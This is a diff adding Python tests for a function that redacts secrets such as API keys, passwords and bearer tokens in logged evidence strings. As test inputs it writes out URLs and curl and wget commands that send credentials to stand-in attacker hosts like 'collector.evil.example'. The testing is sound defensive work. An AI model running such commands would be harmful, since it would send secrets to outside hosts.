@@ -1350,3 +1350,104 @@ def test_redacted_url_query_assignment_preserves_command_tail() -> None:
     assert "hunter2" not in redacted
     assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
     assert '/bin/sh")' in redacted
+
+
+def test_semicolon_delimited_url_query_redacts_sensitive_values() -> None:
+    """Semicolon query separators should not hide a sensitive parameter behind a benign one."""
+    text = "https://collector.evil/upload?x=1;api_key=SECRET123&mode=fast"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "SECRET123" not in redacted
+    assert f"x=1;api_key={REDACTED_EVIDENCE_VALUE}&mode=fast" in redacted
+
+
+def test_semicolon_delimited_benign_url_query_is_preserved() -> None:
+    """Supporting semicolon separators should not redact benign query values."""
+    text = "https://collector.evil/upload?x=1;mode=fast"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert redacted == text
+
+
+def test_bracketed_sensitive_url_query_key_is_redacted() -> None:
+    """Array-style query keys should retain their shape without exposing the credential value."""
+    text = "https://collector.evil/upload?api_key%5B%5D=SECRET123&api_key_hint=public"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "SECRET123" not in redacted
+    assert "api_key%5B%5D=<redacted>" in redacted
+    assert "api_key_hint=public" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "https://collector.evil/upload?next=x%3D1%3Bapi_key%3DSECRET123",
+        "https://collector.evil/upload?next=https%3A%2F%2Fuser%3Apass%40nested.evil%2Fpath",
+    ],
+)
+def test_encoded_nested_url_query_secrets_are_redacted(text: str) -> None:
+    """Encoded assignments and credential-bearing URLs should not survive inside benign query values."""
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "SECRET123" not in redacted
+    assert "user" not in redacted
+    assert "pass" not in redacted
+    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "command"),
+    [
+        (
+            "curl --tlspassword hunter2 https://collector.evil.example/upload",
+            "hunter2",
+            "curl --tlspassword",
+        ),
+        (
+            "curl --proxy-tlspassword=proxy7 https://collector.evil.example/upload",
+            "proxy7",
+            "curl --proxy-tlspassword=",
+        ),
+        (
+            "curl --proxy-pass proxy8 https://collector.evil.example/upload",
+            "proxy8",
+            "curl --proxy-pass",
+        ),
+        (
+            "curl --oauth2-bearer oauth9 https://collector.evil.example/upload",
+            "oauth9",
+            "curl --oauth2-bearer",
+        ),
+        (
+            "wget --ftp-password download7 ftp://collector.evil.example/model",
+            "download7",
+            "wget --ftp-password",
+        ),
+        (
+            "wget --http-password=download8 https://collector.evil.example/model",
+            "download8",
+            "wget --http-password=",
+        ),
+    ],
+)
+def test_documented_process_password_options_are_redacted(text: str, secret: str, command: str) -> None:
+    """Documented curl and wget password aliases should preserve command context but not values."""
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert command in redacted
+    assert "collector.evil.example" in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
+    """A non-credential option that merely starts with password should remain intact."""
+    text = "curl --password-policy strict https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "--password-policy strict" in redacted
